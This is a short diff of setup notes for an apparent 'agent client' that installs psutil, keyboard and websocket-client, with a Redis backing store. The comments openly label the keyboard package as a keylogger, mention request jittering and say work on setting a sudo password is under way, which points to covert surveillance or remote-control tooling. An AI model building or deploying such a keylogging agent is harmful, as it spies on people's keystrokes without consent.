@@ -14,9 +14,9 @@ docker run --rm -p 6379:6379 redis:7 --> redis backing store
 AGENT CLIENT DEPENDANCIES
 Install these utils on the agent machine
 
-pip install psutil # controllare le stat del pc
-pip install keyboard #keylogger
-pip install websocket-client
+pip install psutil -_> check ram and memory stats for jittering lookup requests
+pip install keyboard --> keylogger
+pip install websocket-client --> 
 
 
 Since im working on a way to set sudo password, some command might not be fully working
